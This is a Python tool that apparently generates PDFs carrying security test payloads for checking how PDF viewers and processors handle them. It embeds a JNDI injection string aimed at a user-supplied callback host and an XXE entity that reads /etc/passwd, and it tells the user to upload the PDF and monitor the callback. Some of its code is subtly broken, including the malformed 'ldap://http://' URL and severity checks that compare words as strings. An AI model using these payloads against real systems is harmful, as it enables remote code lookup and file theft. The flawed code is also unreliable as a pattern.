#!/usr/bin/env python3
"""
PDF Security Testing Tool
------------------------
This tool generates PDF files containing various security test payloads for evaluating
PDF processing services and viewers. It is intended ONLY for security testing in 
controlled, isolated environments with explicit authorization.
"""

import os
import io
import logging
import json
from datetime import datetime
import time
from urllib.parse import urlparse
import warnings
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
import argparse
from contextlib import contextmanager
import hashlib
import uuid

try:
    from PyPDF2 import PdfWriter, PdfReader, __version__ as pdf_version
    from reportlab.pdfgen import canvas
    from reportlab.lib.pagesizes import letter
except ImportError as e:
    print(f"Required dependency not found: {e}")
    print("Please install required packages: pip install PyPDF2 reportlab")
    exit(1)

if pdf_version < "3.0.0":
    warnings.warn("PyPDF2 version 3.0.0 or newer is recommended")

class SecurityLevel(Enum):
    """Security levels for test payloads"""
    LOW = "Low"
    MEDIUM = "Medium"
    HIGH = "High"
    CRITICAL = "Critical"

class PayloadCategory(Enum):
    """Categories of security test payloads"""
    METADATA = "metadata"
    JAVASCRIPT = "javascript"
    XSS = "xss"
    SSRF = "ssrf"
    FILE_INCLUSION = "file_inclusion"
    COMMAND_INJECTION = "command_injection"
    XXE = "xxe"
    HTML_INJECTION = "html_injection"
    TEMPLATE_INJECTION = "template_injection"
    SVG_INJECTION = "svg_injection"
    EMBEDDED_FILES = "embedded_files"

@dataclass
class TestPayload:
    """Represents a security test payload with metadata"""
    name: str
    content: str
    category: PayloadCategory
    description: str
    viewer_requirements: List[str]
    expected_outcome: str
    severity: SecurityLevel
    mitigation: str
    tags: List[str] = field(default_factory=list)
    references: List[str] = field(default_factory=list)
    checksum: str = field(init=False)

    def __post_init__(self):
        """Calculate payload checksum after initialization"""
        self.checksum = hashlib.sha256(
            f"{self.name}{self.content}{self.category.value}".encode()
        ).hexdigest()

    def validate(self) -> bool:
        """Validate payload attributes"""
        if not self.name or not isinstance(self.name, str):
            return False
        if not self.content:
            return False
        if not isinstance(self.severity, SecurityLevel):
            return False
        return True

class PDFSecurityException(Exception):
    """Base exception for PDF security testing"""
    pass

class ConfigurationError(PDFSecurityException):
    """Configuration validation errors"""
    pass

class PayloadExecutionError(PDFSecurityException):
    """Payload execution failures"""
    pass

class ValidationError(PDFSecurityException):
    """Data validation errors"""
    pass

@contextmanager
def pdf_operation_context(operation_name: str, logger: logging.Logger):
    """Enhanced context manager for PDF operations"""
    start_time = time.time()
    try:
        logger.info(f"Starting operation: {operation_name}")
        yield
        duration = time.time() - start_time
        logger.info(f"Completed {operation_name} in {duration:.2f}s")
    except Exception as e:
        logger.error(f"Critical failure during {operation_name}: {str(e)}")
        logger.debug("Stack trace:", exc_info=True)
        raise PDFSecurityException(f"{operation_name} failed: {str(e)}") from e

class PDFSecurityTester:
    def __init__(self, callback_url: str, config: Optional[Dict] = None):
        """Initialize the PDF Security Tester"""
        if not self._validate_callback_url(callback_url):
            raise ConfigurationError("Invalid callback URL format")

        self.callback_url = callback_url
        self.test_id = str(uuid.uuid4())
        self.config = config or {}
        
        # Initialize tracking
        self.inserted_payloads: List[TestPayload] = []
        self.execution_log: List[Dict] = []
        self.custom_payloads: List[TestPayload] = []
        self.failed_payloads: List[Tuple[TestPayload, str]] = []
        
        # Set up logging
        self.logger = self._setup_logging()
        
        # Validate configuration
        self._validate_config()
        
        # Load custom payloads
        self._load_custom_payloads()

    @staticmethod
    def _validate_callback_url(url: str) -> bool:
        """Validate callback URL format"""
        try:
            result = urlparse(url)
            if not all([result.scheme, result.netloc]):
                return False
            if result.scheme not in ['http', 'https']:
                return False
            if result.username or result.password:
                return False
            return True
        except Exception:
            return False

    def _setup_logging(self) -> logging.Logger:
        """Configure logging with both file and console handlers"""
        logger = logging.getLogger('PDFSecurityTester')
        logger.setLevel(logging.INFO)
        
        # Add console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        ))
        logger.addHandler(console_handler)
        
        # Add file handler
        log_file = f"pdf_security_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        file_handler = logging.FileHandler(log_file)
        file_handler.setFormatter(logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        ))
        logger.addHandler(file_handler)
        
        return logger

    def _validate_config(self) -> None:
        """Validate the configuration"""
        if not self.config:
            return

        try:
            if 'enabled_categories' in self.config:
                invalid_categories = set(self.config['enabled_categories']) - {c.value for c in PayloadCategory}
                if invalid_categories:
                    raise ConfigurationError(f"Invalid categories in config: {invalid_categories}")
            
            if 'min_severity' in self.config:
                try:
                    SecurityLevel(self.config['min_severity'])
                except ValueError:
                    raise ConfigurationError(f"Invalid severity level: {self.config['min_severity']}")
            
            if 'callback_timeout' in self.config:
                timeout = self.config['callback_timeout']
                if not isinstance(timeout, (int, float)) or timeout <= 0:
                    raise ConfigurationError("callback_timeout must be a positive number")
        except Exception as e:
            self.logger.error(f"Configuration validation error: {str(e)}")
            raise ConfigurationError(f"Configuration validation failed: {str(e)}")

    def _sanitize_payload_content(self, content: str | bytes) -> str | bytes:
        """Basic sanitization of payload content"""
        if isinstance(content, str):
            sanitized = content.replace("\0", "")
            if "<" in content:
                sanitized = sanitized.replace("<script", "&lt;script")
            return sanitized
        elif isinstance(content, bytes):
            return content.replace(b"\0", b"")
        return content

    def _record_payload_execution(self, payload: TestPayload, success: bool, error: Optional[str] = None) -> None:
        """Record payload execution status"""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'payload': payload.name,
            'category': payload.category.value,
            'success': success,
            'error': error,
            'checksum': payload.checksum,
            'severity': payload.severity.value
        }
        self.execution_log.append(entry)
        
        if success:
            self.inserted_payloads.append(payload)
            self.logger.info(f"Successfully executed payload: {payload.name}")
        else:
            self.failed_payloads.append((payload, error or "Unknown error"))
            self.logger.warning(f"Failed to execute payload {payload.name}: {error}")

    def _should_include_payload(self, payload: TestPayload) -> bool:
        """Determine if a payload should be included based on configuration"""
        if not self.config:
            return True
            
        if 'enabled_categories' in self.config:
            if payload.category.value not in self.config['enabled_categories']:
                return False
        
        if 'excluded_payloads' in self.config:
            if payload.name in self.config['excluded_payloads']:
                return False
        
        if 'min_severity' in self.config:
            config_severity = SecurityLevel(self.config['min_severity'])
            if payload.severity.value < config_severity.value:
                return False
        
        return True

    def _load_custom_payloads(self) -> None:
        """Load and validate custom payloads"""
        if 'custom_payloads' not in self.config:
            return

        required_fields = {'name', 'content', 'category', 'severity'}
        
        for payload_data in self.config.get('custom_payloads', []):
            try:
                missing_fields = required_fields - set(payload_data.keys())
                if missing_fields:
                    raise ValidationError(f"Missing required fields: {missing_fields}")
                
                category = PayloadCategory(payload_data['category'])
                severity = SecurityLevel(payload_data['severity'])
                
                payload = TestPayload(
                    name=payload_data['name'],
                    content=self._sanitize_payload_content(payload_data['content']),
                    category=category,
                    description=payload_data.get('description', 'Custom payload'),
                    viewer_requirements=payload_data.get('viewer_requirements', ['Unknown']),
                    expected_outcome=payload_data.get('expected_outcome', 'Unknown'),
                    severity=severity,
                    mitigation=payload_data.get('mitigation', 'Unknown'),
                    tags=payload_data.get('tags', []),
                    references=payload_data.get('references', [])
                )
                
                if not payload.validate():
                    raise ValidationError(f"Invalid payload data for {payload.name}")
                
                self.custom_payloads.append(payload)
                self.logger.info(f"Loaded custom payload: {payload.name}")
                
            except Exception as e:
                self.logger.warning(f"Skipping invalid custom payload: {str(e)}")

    def add_metadata_payloads(self, writer: PdfWriter) -> None:
        """Add metadata-based test payloads"""
        metadata_payloads = [
            TestPayload(
                name="JNDI Injection",
                content=f'${{jndi:ldap://{self.callback_url}/metadata/{self.test_id}}}',
                category=PayloadCategory.METADATA,
                description="Tests JNDI injection via PDF metadata",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="May trigger JNDI lookup in vulnerable environments",
                severity=SecurityLevel.HIGH,
                mitigation="Sanitize metadata fields, disable JNDI lookups"
            ),
            TestPayload(
                name="XXE in Metadata",
                content=f'''<?xml version="1.0"?>
                    <!DOCTYPE data [
                        <!ENTITY file SYSTEM "file:///etc/passwd">
                    ]>
                    <data>&file;</data>''',
                category=PayloadCategory.XXE,
                description="Tests XXE injection via PDF metadata",
                viewer_requirements=["PDF processors with XML parsing"],
                expected_outcome="May read local files if XXE is not disabled",
                severity=SecurityLevel.HIGH,
                mitigation="Disable XXE in XML parsers, sanitize metadata"
            )
        ]
        
        metadata = {}
        for payload in metadata_payloads:
            if self._should_include_payload(payload):
                try:
                    metadata[f'/Test_{payload.name}'] = payload.content
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add metadata payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))
        
        if metadata:
            writer.add_metadata(metadata)

    def create_security_test_pdf(self, output_path: str) -> None:
        """Create a PDF with security test payloads"""
        writer = PdfWriter()
        successful_payloads = 0
        failed_payloads = 0
        
        with pdf_operation_context("PDF creation", self.logger):
            try:
                self.add_metadata_payloads(writer)
                successful_payloads += 1
            except Exception as e:
                self.logger.error(f"Error adding metadata payloads: {str(e)}")
                failed_payloads += 1
            
            try:
                with open(output_path, 'wb') as output_file:
                    writer.write(output_file)
                
                self._generate_report(output_path, {
                    'successful_payloads': successful_payloads,
                    'failed_payloads': failed_payloads,
                    'total_payloads': len(self.execution_log)
                })
            except Exception as e:
                raise PDFSecurityException(f"Failed to save PDF: {str(e)}")

    def _generate_report(self, pdf_path: str, stats: Dict[str, int]) -> None:
        """Generate a detailed test report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'pdf_path': pdf_path,
            'test_id': self.test_id,
            'callback_url': self.callback_url,
            'statistics': stats,
            'configuration': self.config,
            'execution_log': self.execution_log,
            'payloads': [
                {
                    'name': p.name,
                    'category': p.category.value,
                    'description': p.description,
                    'viewer_requirements': p.viewer_requirements,
                    'expected_outcome': p.expected_outcome,
                    'severity': p.severity.value,
                    'mitigation': p.mitigation,
                    'tags': p.tags,
                    'references': p.references,
                    'checksum': p.checksum
                }
                for p in self.inserted_payloads
            ]
        }
        
        report_path = f"{pdf_path}.report.json"
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"Test report generated: {report_path}")
        
        print("\nTest Execution Summary:")
        print(f"Successful: {stats['successful_payloads']}")
        print(f"Failed: {stats['failed_payloads']}")
        print(f"\nDetailed report saved to: {report_path}")


def main():
    """Main execution function"""
    parser = argparse.ArgumentParser(
        description='PDF Security Test Generator - FOR AUTHORIZED TESTING ONLY',
        epilog='WARNING: Use only in controlled environments with proper authorization.'
    )
    parser.add_argument('--callback-host', required=True, help='Callback host for SSRF tests')
    parser.add_argument('--callback-port', required=True, help='Callback port')
    parser.add_argument('--output', default='security_test.pdf', help='Output PDF path')
    parser.add_argument('--config', help='Path to configuration JSON file')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Set up logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    logger = logging.getLogger('PDFSecurityTester')
    
    # Display security warning
    logger.warning("""
    ⚠️  WARNING: This tool generates PDFs containing security test payloads.
    Only use in authorized, controlled environments for security testing.
    Never use against production systems without explicit permission.
    """)
    
    callback_url = f"http://{args.callback_host}:{args.callback_port}"
    
    # Load configuration if provided
    config = None
    if args.config:
        try:
            with open(args.config) as f:
                config = json.load(f)
        except Exception as e:
            logger.error(f"Error loading configuration file: {str(e)}")
            return

    try:
        tester = PDFSecurityTester(callback_url, config)
        tester.create_security_test_pdf(args.output)
        
        print("\nPDF Security Test Suite - Complete")
        print(f"\nGenerated files:")
        print(f"1. Test PDF: {args.output}")
        print(f"2. Test Report: {args.output}.report.json")
        
        print("\nNext Steps:")
        print("1. Review the test report for payload details")
        print("2. Upload the PDF to your testing environment")
        print("3. Monitor the callback URL for active payloads")
        print("4. Test with different PDF viewers:")
        print("   - Adobe Acrobat DC (JavaScript execution)")
        print("   - PDF.js (Content rendering)")
        print("   - Chrome PDF Viewer (Basic rendering)")
        print("5. Review processing logs for errors")
        
    except Exception as e:
        logger.error(f"Error running security tests: {str(e)}")
        raise


if __name__ == "__main__":
    main()
